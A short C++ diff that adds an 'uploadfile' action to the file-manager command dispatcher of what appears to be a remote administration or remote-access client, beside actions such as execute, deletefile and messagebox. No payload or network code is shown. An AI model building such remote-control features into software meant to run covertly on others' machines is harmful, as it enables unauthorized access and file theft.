@@ -145,7 +145,8 @@ private:
             }
             else if (action == "getdrives" || action == "getfiles" || action == "deletefile" ||
                      action == "rename"   || action == "execute"  || action == "createfolder" ||
-                     action == "copyfile" || action == "pastefile" || action == "downloadfile") {
+                     action == "copyfile" || action == "pastefile" || action == "downloadfile" ||
+                     action == "uploadfile") {
                 execute_file_manager_command(data);
             }
             else if (action == "message" || action == "messagebox") {
